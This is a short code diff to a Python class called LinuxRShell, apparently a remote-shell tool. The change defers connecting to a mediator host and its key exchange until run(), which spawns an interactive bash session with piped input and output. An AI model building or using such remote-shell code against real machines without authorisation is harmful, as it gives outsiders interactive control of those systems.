@@ -22,8 +22,8 @@ class LinuxRShell:
         self.plugins = self.loadPlugins()
         if not mediatorHost:
             raise(ValueError("Hostname of mediator server not specified."))
-        self.connect(mediatorHost)
-        self.cipherKey = self.keyExchange()
+        self.mediatorHost = mediatorHost
+        # self.cipherKey defined in LinuxRShell.run()
 
     def loadPlugins(self):
         commandClasses = inspect.getmembers(plugins, inspect.isclass)
@@ -91,6 +91,8 @@ class LinuxRShell:
         verification = self.handler.recv(1024)
 
     def run(self):
+        self.connect(self.mediatorHost)
+        self.cipherKey = self.keyExchange()
         bash = subprocess.Popen(["/bin/bash", "-i"],
                                 shell=True,
                                 stdout=subprocess.PIPE,
